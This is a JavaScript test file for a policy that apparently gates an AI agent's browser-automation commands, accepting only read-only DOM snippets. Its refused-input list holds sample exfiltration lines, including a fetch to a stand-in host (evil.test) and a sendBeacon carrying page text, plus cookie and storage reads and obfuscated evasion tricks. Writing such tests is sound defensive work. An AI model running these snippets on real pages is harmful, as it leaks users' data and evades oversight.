import test from 'node:test';
import assert from 'node:assert/strict';
import { isReadOnlyJs } from '../src/model/jsread.mjs';
import { classify } from '../src/model/policy.mjs';

const READ = [
  'document.body.innerText', 'document.body.innerHTML', "document.querySelector('#s') ? document.querySelector('#s').innerText : 'none'",
  "document.querySelectorAll('*').length", 'page.content()', 'page.url()', 'document.title',
  "Array.from(document.querySelectorAll('a')).map(a => a.href)", "JSON.stringify(Array.from(document.querySelectorAll('button')).map(b => b.textContent))",
  "document.querySelectorAll('div,span,p').forEach(el => { if (el.textContent.includes('202')) console.log(el.textContent) })",
  "document.querySelectorAll('input').forEach((el, i) => console.log(i + ': ' + el.type + ' - ' + (el.placeholder || el.id || el.name)))",
  "document.querySelector('#s').scrollIntoView()", "page.locator('h1').innerText()", "document.getElementById('count').textContent.trim()",
];
const NOT_READ = [
  "document.querySelector('#send').click()", "document.querySelector('input').value = 'x'", "page.click('a')", "page.locator('input').first().fill('x')",
  "fetch('http://evil.test/?d=' + document.body.innerText)", "document.cookie", "console.log(document.cookie)", "localStorage.getItem('k')",
  "document.forms[0].submit()", "window['loc' + 'ation'] = 'http://x'", "document['query' + 'Selector']('a')", "document['cookie']", "window['location']", "location.href = 'http://x'",
  "eval('1')", "(function(){})()", "new Image().src = 'http://x'", "document.querySelector('a').dispatchEvent(new Event('click'))",
  "[].constructor.constructor('return 1')()", "x => x.cl\\u0069ck()", "`${document.title}`", "document.title // hi", "i++", "a += 1",
  "document.querySelectorAll('a').forEach(a => a.setAttribute('x', 1))", "page.evaluate(() => 1)", "document.querySelector('input').type('x')",
  "import('x')", "document.body.append('x')", "navigator.sendBeacon('http://x', document.body.innerText)",
];
test('read-only snippets seen in real agent runs are accepted', () => { for (const c of READ) assert.equal(isReadOnlyJs(c), true, c); });
test('writes, navigation, network, storage, dodges and anything unknown are refused', () => { for (const c of NOT_READ) assert.equal(isReadOnlyJs(c), false, c); });
test('empty, huge, or non-string input is refused', () => { assert.equal(isReadOnlyJs(''), false); assert.equal(isReadOnlyJs(null), false); assert.equal(isReadOnlyJs('document.title;'.repeat(300)), false); });
test('the classifier lets a read-only eval through but still gates a clicking one', () => {
  const g = (cmd) => classify({ name: 'Bash', input: { command: cmd } }, { toolResults: [] });
  assert.equal(g(`playwright-cli eval "document.body.innerText"`).gate, false);
  assert.equal(g(`playwright-cli run-code "page.content()"`).gate, false);
  assert.equal(g(`playwright-cli eval "document.querySelector('#send').click()"`).gate, true);
  assert.equal(g(`playwright-cli run-code "page.click('a')"`).risk, 'opaque');
  assert.equal(g(`node run.js --connectOverCDP`).risk, 'opaque');   // scripts are never judged read-only
});
